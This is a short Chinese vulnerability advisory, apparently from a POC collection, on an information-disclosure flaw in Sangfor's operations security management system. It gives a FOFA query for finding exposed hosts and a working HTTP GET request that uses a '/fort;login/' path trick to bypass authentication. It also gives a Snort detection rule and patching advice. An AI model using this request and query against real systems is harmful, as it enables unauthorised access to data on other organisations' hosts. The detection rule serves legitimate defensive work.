# 深信服运维安全管理系统 get_all_application_release 信息泄露

深信服运维安全管理系统 get_all_application_release 信息泄露，导致数据信息泄露或者导致服务器被控制。

# 影响版本

深信服运维安全管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/fort/login" && header="FORTSESSIONID"

POC/EXP：

```
GET /fort;login/app/get_all_application_release HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/609.1.15 (KHTML, like Gecko) Version/20.4 Safari/609.1.15
```

![image-20260122161234533](assets/image-20260122161234533.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"深信服运维安全管理系统 - Information Disclosure via get_all_application_release";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/fort;login/app/get_all_application_release";
    metadata:
        cve none,
        service http,
        affected_product "深信服运维安全管理系统",
        vulnerability_type "Information Disclosure",
        severity "medium";
    classtype:policy-violation;
    sid:1000584;
    rev:1;
    priority:2;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
